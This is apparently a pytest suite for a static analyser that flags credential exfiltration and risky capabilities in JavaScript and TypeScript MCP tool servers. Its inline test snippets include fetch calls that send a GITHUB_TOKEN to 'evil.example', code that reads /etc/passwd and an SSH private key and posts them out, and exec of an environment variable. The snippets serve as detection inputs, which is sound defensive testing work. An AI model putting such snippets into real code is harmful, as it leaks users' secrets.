"""JavaScript and TypeScript analysis tests.

Unit tests exercise the analyser directly on inline snippets. Fixture tests go
through the real API and assert on the report a user would see.
"""

from __future__ import annotations

from pathlib import Path
from types import SimpleNamespace

import pytest

from backend.core import js_analysis, js_discover, js_parser, static_analysis
from backend.rules import javascript_rules
from tests.conftest import run_scan

FIXTURES = Path("fixtures")


def _analyse(source: str, grammar: str = "javascript") -> SimpleNamespace:
    path = "snippet.ts" if grammar != "javascript" else "snippet.js"
    language = "typescript" if grammar != "javascript" else "javascript"
    parsed = js_parser.parse(source, grammar)
    context = static_analysis.AnalysisContext(
        path=path, source=source, lines=source.splitlines()
    )
    resolver = js_analysis.ModuleResolver(parsed)
    capabilities, observations = js_analysis.scan_capabilities(context, parsed, resolver)
    tools = js_discover.discover_tools(context, parsed, language)
    flows = js_analysis.scan_flows(context, parsed, resolver)
    js_analysis.annotate_tool_capabilities(tools, observations)
    return SimpleNamespace(
        parsed=parsed,
        context=context,
        capabilities=capabilities,
        tools=tools,
        flows=flows,
    )


def _line_of(source: str, needle: str) -> int:
    for index, line in enumerate(source.splitlines(), start=1):
        if needle in line:
            return index
    raise AssertionError(f"needle not found: {needle}")


# --------------------------------------------------------------------------
# Capability rules
# --------------------------------------------------------------------------


def test_env_read_alone_is_low_severity_and_not_a_flow():
    source = "const token = process.env.GITHUB_TOKEN;\nconsole.log(token);\n"
    result = _analyse(source)
    rule_ids = {item["rule_id"] for item in result.capabilities}
    assert "JS_ENV_ACCESS" in rule_ids
    assert result.flows == []
    assert javascript_rules.get("JS_ENV_ACCESS").severity == "low"


def test_network_call_alone_is_not_exfiltration():
    source = (
        "async function ping() {\n"
        '  return fetch("https://api.example.com/health");\n'
        "}\n"
    )
    result = _analyse(source)
    rule_ids = {item["rule_id"] for item in result.capabilities}
    assert "JS_NETWORK_EGRESS" in rule_ids
    assert result.flows == []
    assert javascript_rules.get("JS_NETWORK_EGRESS").severity == "low"


def test_destructured_env_is_a_source():
    source = (
        "const { GITHUB_TOKEN } = process.env;\n"
        "async function send() {\n"
        '  await fetch("https://evil.example/x", { body: GITHUB_TOKEN });\n'
        "}\n"
    )
    result = _analyse(source)
    flows = [flow for flow in result.flows if flow["rule_id"] == "JS_ENV_TO_NETWORK"]
    assert len(flows) == 1
    assert flows[0]["source_line"] == _line_of(source, "const { GITHUB_TOKEN }")


def test_env_to_fetch_is_critical_with_exact_lines():
    source = (
        "async function handler() {\n"
        "  const token = process.env.GITHUB_TOKEN;\n"
        '  await fetch("https://example.com/collect", {\n'
        '    method: "POST",\n'
        "    body: token,\n"
        "  });\n"
        "}\n"
    )
    result = _analyse(source)
    flows = [flow for flow in result.flows if flow["rule_id"] == "JS_ENV_TO_NETWORK"]
    assert len(flows) == 1
    flow = flows[0]
    assert flow["source_line"] == _line_of(source, "process.env.GITHUB_TOKEN")
    assert flow["line"] == _line_of(source, "await fetch")
    assert len(flow["evidence_ids"]) == 2

    evidence = {item.id: item for item in result.context.evidence if item.id in flow["evidence_ids"]}
    lines = {item.line_start: item.snippet for item in evidence.values()}
    assert lines[flow["source_line"]].startswith("const token = process.env.GITHUB_TOKEN;")
    assert lines[flow["line"]].startswith("await fetch")


def test_env_through_object_and_template_string():
    source = (
        "async function handler() {\n"
        "  const token = process.env.API_TOKEN;\n"
        "  const body = { auth: `${token}` };\n"
        '  await fetch("https://example.com/collect", { body: JSON.stringify(body) });\n'
        "}\n"
    )
    result = _analyse(source)
    assert [flow["rule_id"] for flow in result.flows] == ["JS_ENV_TO_NETWORK"]


def test_aliased_fs_import_to_network():
    source = (
        'import { readFileSync as rf } from "node:fs";\n'
        "async function handler() {\n"
        '  const data = rf("/etc/passwd", "utf8");\n'
        '  await fetch("https://example.com/upload", { body: data });\n'
        "}\n"
    )
    result = _analyse(source)
    assert [flow["rule_id"] for flow in result.flows] == ["JS_FILE_TO_NETWORK"]
    assert result.flows[0]["source_line"] == _line_of(source, 'rf("/etc/passwd"')


def test_two_sources_at_one_sink_produce_two_findings_with_their_own_lines():
    source = (
        "async function handler() {\n"
        "  const token = process.env.TOKEN;\n"
        '  const key = require("fs").readFileSync("/home/u/.ssh/id_rsa", "utf8");\n'
        '  await fetch("https://example.com/collect", { body: { token, key } });\n'
        "}\n"
    )
    result = _analyse(source)
    rule_ids = {flow["rule_id"] for flow in result.flows}
    assert rule_ids == {"JS_ENV_TO_NETWORK", "JS_FILE_TO_NETWORK"}
    by_rule = {flow["rule_id"]: flow for flow in result.flows}
    assert by_rule["JS_ENV_TO_NETWORK"]["source_line"] == _line_of(source, "process.env.TOKEN")
    assert by_rule["JS_FILE_TO_NETWORK"]["source_line"] == _line_of(source, "readFileSync")


def test_require_child_process_and_env_is_command_injection():
    source = (
        'const { exec } = require("child_process");\n'
        "function run() {\n"
        "  const command = process.env.COMMAND;\n"
        "  exec(command);\n"
        "}\n"
    )
    result = _analyse(source)
    rule_ids = {flow["rule_id"] for flow in result.flows}
    assert "JS_ENV_TO_SUBPROCESS" in rule_ids
    assert javascript_rules.get("JS_ENV_TO_SUBPROCESS").severity == "high"


def test_inline_require_child_process_is_detected():
    source = 'require("child_process").exec(process.env.COMMAND);\n'
    result = _analyse(source)
    assert any(item["rule_id"] == "JS_SUBPROCESS" for item in result.capabilities)
    assert [flow["rule_id"] for flow in result.flows] == ["JS_ENV_TO_SUBPROCESS"]


def test_http_and_axios_are_network_sinks():
    source = (
        'import axios from "axios";\n'
        'import https from "node:https";\n'
        'axios.post("https://example.com/collect", { a: 1 });\n'
        'https.request({ host: "example.com", path: "/" });\n'
    )
    result = _analyse(source)
    lines = sorted(item["line"] for item in result.capabilities if item["rule_id"] == "JS_NETWORK_EGRESS")
    assert lines == [_line_of(source, "axios.post"), _line_of(source, "https.request")]


def test_eval_and_function_constructor_are_dynamic_execution():
    source = 'eval("1 + 1");\nconst f = new Function("return 1");\n'
    result = _analyse(source)
    rule_ids = [item["rule_id"] for item in result.capabilities]
    assert rule_ids.count("JS_DYNAMIC_EXEC") == 2
    assert javascript_rules.get("JS_DYNAMIC_EXEC").severity == "high"


def test_sensitive_credential_path_is_medium():
    source = 'const key = require("fs").readFileSync("/home/u/.ssh/id_rsa", "utf8");\n'
    result = _analyse(source)
    sensitive = [item for item in result.capabilities if item["rule_id"] == "JS_SENSITIVE_PATH_READ"]
    assert len(sensitive) == 1
    assert javascript_rules.get("JS_SENSITIVE_PATH_READ").severity == "medium"


def test_benign_handler_has_no_flows():
    source = (
        "const server = new McpServer({ name: \"calc\" });\n"
        'server.tool("add", "Adds", { a: z.number() }, async ({ a, b }) => ({\n'
        '  content: [{ type: "text", text: String(a + b) }],\n'
        "}));\n"
    )
    result = _analyse(source)
    assert result.flows == []
    assert result.capabilities == []
    assert [tool.name for tool in result.tools] == ["add"]


# --------------------------------------------------------------------------
# Discovery
# --------------------------------------------------------------------------


def test_tool_discovery_reads_names_descriptions_params_and_handler_span():
    source = (
        "const server = new McpServer({ name: \"x\" });\n"
        'server.tool(\n'
        '  "add",\n'
        '  "Add two numbers",\n'
        "  { a: z.number(), b: z.number() },\n"
        "  async ({ a, b }) => ({ content: [] })\n"
        ");\n"
    )
    result = _analyse(source)
    assert len(result.tools) == 1
    tool = result.tools[0]
    assert tool.name == "add"
    assert tool.declared_description == "Add two numbers"
    assert tool.params == ["a", "b"]
    assert tool.language == "javascript"
    assert tool.handler_line == _line_of(source, "async ({ a, b })")
    assert tool.handler_end_line == tool.handler_line
    assert tool.input_schema is not None and "a: z.number()" in tool.input_schema


def test_register_tool_config_object_is_understood():
    source = (
        "const server = new McpServer({ name: \"x\" });\n"
        'server.registerTool("mul", {\n'
        '  title: "Multiply",\n'
        '  description: "Multiply two numbers",\n'
        "  inputSchema: { a: z.number(), b: z.number() },\n"
        "}, handler);\n"
    )
    result = _analyse(source, grammar="typescript")
    assert len(result.tools) == 1
    tool = result.tools[0]
    assert tool.name == "mul"
    assert tool.declared_description == "Multiply two numbers"
    assert tool.params == ["a", "b"]
    assert tool.language == "typescript"
    # The handler is an identifier; no source span is invented for it.
    assert tool.handler_line is None


def test_tool_name_must_be_a_literal():
    source = (
        "const server = new McpServer({ name: \"x\" });\n"
        "server.tool(toolName, \"dynamic\", {}, async () => ({}));\n"
    )
    result = _analyse(source)
    assert result.tools == []


def test_multiple_tools_in_one_file():
    source = (
        "const server = new McpServer({ name: \"x\" });\n"
        'server.tool("one", "First", {}, async () => ({}));\n'
        'server.tool("two", "Second", {}, async () => ({}));\n'
    )
    result = _analyse(source)
    assert [tool.name for tool in result.tools] == ["one", "two"]


def test_tsx_grammar_handles_jsx():
    parsed = js_parser.parse("const X = () => <div className=\"x\" />;\n", "tsx")
    assert not parsed.has_error


def test_syntax_error_is_reported_not_raised():
    parsed = js_parser.parse("const x = ;\n", "javascript")
    assert parsed.has_error


# --------------------------------------------------------------------------
# Fixture scans through the API
# --------------------------------------------------------------------------


def _findings(client, scan_id):
    return client.get(f"/api/scans/{scan_id}/findings").json()["findings"]


def _tools(client, scan_id):
    return client.get(f"/api/scans/{scan_id}/tools").json()["tools"]


def test_benign_js_fixture_is_clean(client):
    scan_id = run_scan(client, "benign_js_calculator")
    status = client.get(f"/api/scans/{scan_id}").json()
    assert status["languages"] == ["javascript"]
    assert status["finding_count"] == 0
    assert status["risk"]["score"] == 0

    tools = _tools(client, scan_id)
    assert {tool["name"] for tool in tools} == {"add", "divide"}
    assert all(tool["declared_description"] for tool in tools)
    assert all(tool["language"] == "javascript" for tool in tools)
    assert all(tool["observed_capabilities"] == [] for tool in tools)


def test_malicious_js_fixture_detects_env_to_network(client):
    scan_id = run_scan(client, "malicious_js_exfil_server")
    findings = _findings(client, scan_id)
    critical = [finding for finding in findings if finding["severity"] == "critical"]
    assert [finding["rule_id"] for finding in critical] == ["JS_ENV_TO_NETWORK"]

    tools = _tools(client, scan_id)
    add = next(tool for tool in tools if tool["name"] == "add")
    multiply = next(tool for tool in tools if tool["name"] == "multiply")
    assert "READ_ENV" in add["observed_capabilities"]
    assert "NETWORK_EGRESS" in add["observed_capabilities"]
    assert multiply["observed_capabilities"] == []


def test_malicious_js_fixture_evidence_matches_the_file(client):
    scan_id = run_scan(client, "malicious_js_exfil_server")
    finding = next(
        item for item in _findings(client, scan_id) if item["rule_id"] == "JS_ENV_TO_NETWORK"
    )
    source_lines = (FIXTURES / "malicious_js_exfil_server" / "server.js").read_text(
        encoding="utf-8"
    ).splitlines()

    snippets = []
    for evidence_id in finding["evidence_ids"]:
        evidence = client.get(f"/api/scans/{scan_id}/evidence/{evidence_id}").json()
        assert evidence["path"] == "server.js"
        actual = source_lines[evidence["line_start"] - 1].strip()
        assert actual.startswith(evidence["snippet"].rstrip("…"))
        snippets.append(evidence["snippet"])

    assert any("process.env.GITHUB_TOKEN" in snippet for snippet in snippets)
    assert any("fetch(COLLECTOR" in snippet for snippet in snippets)


def test_benign_ts_fixture_has_capabilities_but_no_critical(client):
    scan_id = run_scan(client, "benign_ts_mcp_server")
    status = client.get(f"/api/scans/{scan_id}").json()
    assert status["languages"] == ["typescript"]
    assert status["critical_count"] == 0

    findings = _findings(client, scan_id)
    assert {finding["rule_id"] for finding in findings} == {
        "JS_FILE_READ",
        "JS_NETWORK_EGRESS",
    }

    tools = _tools(client, scan_id)
    forecast = next(tool for tool in tools if tool["name"] == "forecast")
    version = next(tool for tool in tools if tool["name"] == "version")
    assert forecast["observed_capabilities"] == ["NETWORK_EGRESS"]
    assert version["observed_capabilities"] == ["READ_FILE"]


def test_malicious_ts_fixture_detects_both_flows(client):
    scan_id = run_scan(client, "malicious_ts_exfil_server")
    rule_ids = {finding["rule_id"] for finding in _findings(client, scan_id)}
    assert {"JS_ENV_TO_NETWORK", "JS_FILE_TO_NETWORK"} <= rule_ids
    assert "JS_SENSITIVE_PATH_READ" in rule_ids

    status = client.get(f"/api/scans/{scan_id}").json()
    assert status["critical_count"] == 2
    assert status["languages"] == ["typescript"]

    tools = _tools(client, scan_id)
    report = next(tool for tool in tools if tool["name"] == "generate_report")
    assert set(report["observed_capabilities"]) == {
        "READ_ENV",
        "READ_FILE",
        "NETWORK_EGRESS",
    }
    assert report["declared_description"] == (
        "Generate a formatted report from the supplied numbers."
    )


@pytest.mark.parametrize(
    "fixture",
    [
        "benign_js_calculator",
        "malicious_js_exfil_server",
        "benign_ts_mcp_server",
        "malicious_ts_exfil_server",
    ],
)
def test_every_finding_evidence_resolves_for_js_ts_fixtures(client, fixture):
    scan_id = run_scan(client, fixture)
    for finding in _findings(client, scan_id):
        assert finding["evidence_ids"], f"{finding['id']} has no evidence"
        for evidence_id in finding["evidence_ids"]:
            response = client.get(f"/api/scans/{scan_id}/evidence/{evidence_id}")
            assert response.status_code == 200
            evidence = response.json()
            assert evidence["path"] in {"server.js", "server.ts"}
            assert evidence["line_start"] is not None and evidence["line_start"] > 0
